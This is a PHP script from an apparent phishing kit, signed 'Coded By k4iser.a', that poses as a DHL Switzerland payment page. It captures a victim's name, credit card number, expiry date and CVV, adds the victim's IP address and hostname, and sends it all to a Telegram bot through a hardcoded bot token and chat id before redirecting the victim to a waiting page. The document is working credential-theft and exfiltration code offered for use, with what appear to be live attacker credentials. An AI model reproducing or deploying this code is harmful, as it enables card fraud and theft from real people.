<?php


$name=$_POST["name"];
$cc=$_POST["cc"];
$date=$_POST["date"];
$cvv=$_POST["cvv"];

$rand=rand(1000000,999999999).rand(1000000,999999999);
$rand2=base64_encode($rand);
	

        $_SESSION['name'] = $name;
        $_SESSION['cc'] = $cc;
        $_SESSION['date'] = $date;
        $_SESSION['cvv'] = $cvv;
	



$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "~ Coded By k4iser.a  ~\n";
$message .= "|----------|CC DHL-CH |----------|\n";
$message .= "Name  : ".$_SESSION['name']."\n";
$message .= "CREDIT CARD    : ".$_SESSION['cc']."\n";
$message .= "EXPIRATION DATE    : ".$_SESSION['date']."\n";
$message .= "CVV    : ".$_SESSION['cvv']."\n";
$message .= "|------------------+|IP|-------------------|\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "Hostname  : ".$hostname."\n";
$subject = "~ <Rslt-DHL-CH>- Coded By k4iser.a ~ | $ip";


$token = "6594122982:AAGNFbs0G20wadGIEQ8ZyI-bEruyeCNSlzo";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=6413015802&text=" . urlencode($message)."" );
	
header("location:wait.php?vc?__event=card&service_id=top_card=AU")
?>